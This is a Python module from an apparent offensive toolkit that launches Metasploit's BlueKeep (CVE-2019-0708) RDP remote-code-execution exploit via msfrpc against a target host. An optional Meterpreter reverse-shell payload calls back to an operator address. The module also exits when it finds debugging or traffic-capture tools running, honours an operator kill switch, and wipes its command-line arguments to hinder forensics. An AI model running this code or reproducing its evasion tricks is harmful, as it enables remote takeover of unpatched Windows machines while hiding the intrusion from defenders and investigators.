# File: modules/exploit_lib/cve_2019_0708_bluekeep.py

"""
BlueKeep RDP RCE exploit using Metasploitâ€™s `cve_2019_0708_bluekeep_rce` module
via msfrpc. (Fixed missing import, improved error handling, dynamic payload selector.)
"""


import logging
import subprocess
import time                # <-- added
import os
import subprocess
from bismillah import log_event
from metasploit.msfrpc import MsfRpcClient

# --- Anti-debugging: exit if under analysis ---
def is_debugger_present():
    tools = ["wireshark", "tcpdump", "strace", "gdb", "lldb", "dtruss", "Instruments", "fs_usage"]
    try:
        out = subprocess.check_output(["ps", "aux"], text=True)
        for t in tools:
            if t in out:
                return True
    except Exception:
        pass
    return False

# --- Operator kill switch (magic file) ---
def check_kill_switch():
    home = os.environ.get("HOME", "")
    return os.path.exists(os.path.join(home, ".bismillah_kill"))

logger = logging.getLogger("cve_2019_0708_bluekeep")

def exploit(target: str, port: int = 3389, use_payload: str = None) -> dict:
    """
    target: "192.168.1.40"
    port: 3389
    use_payload: optional Meterpreter payload string (e.g., "windows/x64/meterpreter/reverse_tcp")
    Attempts to run the BlueKeep module; if use_payload is None, runs crashonly mode.
    """
    # --- Anti-debugging and kill switch ---
    if is_debugger_present():
        logger.error("[!] Debugger or analysis tool detected. Exiting.")
        return {"status": "error", "detail": "Debugger detected"}
    if check_kill_switch():
        logger.error("[!] Operator kill switch present. Exiting.")
        return {"status": "error", "detail": "Operator kill switch present"}

    try:
        msf_host = "127.0.0.1"
        msf_port = 55553
        user = "msf"
        pwd = "abc123"
        module_name = "exploit/windows/rdp/cve_2019_0708_bluekeep_rce"

        logger.info(f"[+] Connecting to msfrpcd at {msf_host}:{msf_port}")
        client = MsfRpcClient(pwd, server=msf_host, port=msf_port, username=user)
        logger.info("[+] Authenticated to msfrpcd")

        mod = client.modules.use("exploit", module_name)
        mod["RHOSTS"] = target
        mod["RPORT"] = port

        if use_payload:
            mod["PAYLOAD"] = use_payload
            # LHOST/LPORT are pulled from a global config or defaults
            mod["LHOST"] = "192.168.1.10"
            mod["LPORT"] = 4444

        logger.info(f"[+] Launching BlueKeep exploit (payload={'none' if not use_payload else use_payload})")
        job_id = mod.execute()
        logger.info(f"[+] Module job queued as ID {job_id}, waiting 15s for sessions")
        time.sleep(15)

        sessions = client.sessions.list
        # --- Anti-forensics: wipe argv after execution ---
        import sys
        for i in range(len(sys.argv)):
            if sys.argv[i]:
                sys.argv[i] = "\0" * len(sys.argv[i])

        if sessions:
            logger.info(f"[+] Sessions: {sessions}")
            return {"status": "ok", "sessions": sessions}
        else:
            return {"status": "error", "detail": "No sessions  target might not be vulnerable or network blocked."}
    except Exception as e:
        logger.error(f"[-] BlueKeep exploit failed: {e}")
        return {"status": "error", "detail": str(e)}
